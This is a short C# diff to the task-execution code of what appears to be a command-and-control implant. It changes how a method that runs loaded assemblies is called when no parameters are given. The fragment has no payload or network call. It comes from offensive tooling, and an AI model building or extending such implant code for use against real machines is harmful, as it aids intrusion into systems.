@@ -44,7 +44,8 @@ namespace Implant.Tasks.Execute
                 }
             }
 
-            return LoadFunctions.ExecuteAssemMethod(assemName, assemType, assemMethod, assemParams);
+            if (assemParams == "") { return LoadFunctions.ExecuteAssemMethod(assemName, assemType, assemMethod); }
+            else { return LoadFunctions.ExecuteAssemMethod(assemName, assemType, assemMethod, assemParams); }
         }
     }
 }
